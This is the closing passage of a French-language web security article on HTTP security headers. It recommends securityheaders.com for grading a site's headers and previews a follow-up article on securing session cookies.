### Tester votre posture de sécurité

Je veux conclure cet article avec une référence à [securityheaders.com](https://securityheaders.com/), un site web incroyablement utile qui vous permet de vérifier que votre application web dispose des bons en-têtes liés à la sécurité. Après avoir soumis une URL, vous recevrez une note et une analyse, en-tête par en-tête. Voici un [rapport d'exemple pour facebook.com](https://securityheaders.com/?q=https%3A%2F%2Ffacebook.com&followRedirects=on) :

![Image](https://cdn-media-1.freecodecamp.org/images/wRL6EeQ9esBDg9XSSWe5jMvWWXCzzkLNz1GV)

Si vous avez des doutes sur le point de départ, securityheaders.com est un excellent endroit pour obtenir une première évaluation.

### HTTP stateful : gérer les sessions avec des cookies

Cet article devrait vous avoir introduit à quelques en-têtes HTTP intéressants, vous permettant de comprendre comment ils renforcent nos applications web grâce à des fonctionnalités spécifiques au protocole, avec un peu d'aide des navigateurs grand public.

Dans le [prochain article](https://medium.freecodecamp.org/web-security-hardening-http-cookies-be8d8d8016e1), nous plongerons profondément dans l'une des fonctionnalités les plus mal comprises du protocole HTTP : les cookies.

Nés pour apporter une sorte d'état à l'HTTP autrement sans état, les cookies ont probablement été utilisés (et mal utilisés) par chacun d'entre nous afin de supporter les sessions dans nos applications web : chaque fois qu'il y a un état que nous aimerions persister, il est toujours facile de dire « stockez-le dans un cookie ». Comme nous le verrons, les cookies ne sont pas toujours les coffres-forts les plus sûrs et doivent être traités avec soin lorsqu'il s'agit d'informations sensibles.

_Publié à l'origine sur [odino.org](https://odino.org/secure-your-web-application-with-these-http-headers/) (23 août 2018)._
_Vous pouvez me suivre sur [Twitter](https://twitter.com/_odino_) — les rants sont les bienvenus !_ ?